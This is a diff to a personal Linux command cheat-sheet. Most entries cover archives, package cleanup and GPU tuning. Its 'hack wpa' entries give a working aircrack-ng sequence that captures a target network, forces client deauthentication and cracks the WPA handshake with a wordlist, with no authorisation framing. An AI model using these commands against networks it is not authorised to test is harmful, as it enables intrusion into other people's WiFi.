@@ -37,7 +37,7 @@ backup through ssh
 unrar all archives in folder (autoverwrite enabled)  
 `find . -name "*.rar" -exec unrar x -o+ {} \;`  
 
-show cpu frequency 
+show cpu frequency  
 `cat /proc/cpuinfo | grep "MHz" & watch -n1 "cat /proc/cpuinfo | grep \"^[c]pu MHz\""`  
 
 force cpu governor  
@@ -62,22 +62,32 @@ output orphaned packages to file & run removal
 `sudo pacman -Qqdt > pkglist.txt`  
 `sudo pacman -R - < pkglist.txt`  
 
-hack wpa $ airmon-ng start wlp2s0f0u4 & airodump wlp2s0f0u4mon  
+hack wpa    
+`airmon-ng start wlp2s0f0u4 & airodump wlp2s0f0u4mon`  
 
-hack wpa target network $ airodump-ng -c 10 --bssid 00:14:BF:E0:E8:D5 -w /root/aircrack/ wlp2s0f0u4mon  
+hack wpa target network  
+`airodump-ng -c 10 --bssid 00:14:BF:E0:E8:D5 -w /root/aircrack/ wlp2s0f0u4mon`  
 
-force handshake $ aireplay-ng –0 2 –a [router bssid] –c [client bssid] wlp2s0f0u4mon  
+force handshake  
+`aireplay-ng –0 2 –a [router bssid] –c [client bssid] wlp2s0f0u4mon`  
 
-crack with wordlist $ aircrack-ng -a2 -b [router bssid] -w [path to wordlist] /root/aircrack/*.cap  
+crack with wordlist  
+`aircrack-ng -a2 -b [router bssid] -w [path to wordlist] /root/aircrack/*.cap`  
 
-get nvme temperature $ sudo nvme smart-log /dev/nvme0 | grep temperature  
+get nvme temperature  
+`sudo nvme smart-log /dev/nvme0 | grep temperature`  
 
-delete all but given extension $ find . -type f ! -name '*.txt' -delete  
+delete all but given extension  
+`find . -type f ! -name '*.txt' -delete`  
 
-amd vega current values $ watch -n 0.5 sudo cat /sys/kernel/debug/dri/0/amdgpu_pm_info  
+amd vega current values  
+`watch -n 0.5 sudo cat /sys/kernel/debug/dri/0/amdgpu_pm_info`  
 
-disable vsync environment variable $ vblank_mode=0  
+disable vsync environment variable  
+`vblank_mode=0`  
 
-current vega voltage values $ sudo cat /sys/class/drm/card0/device/pp_od_clk_voltage  
+current vega voltage values  
+`sudo cat /sys/class/drm/card0/device/pp_od_clk_voltage`  
 
-force high dpm on graphics card $ echo high > /sys/class/drm/card0/device/power_dpm_force_performance_level  
+force high dpm on graphics card 
+`echo high > /sys/class/drm/card0/device/power_dpm_force_performance_level`  
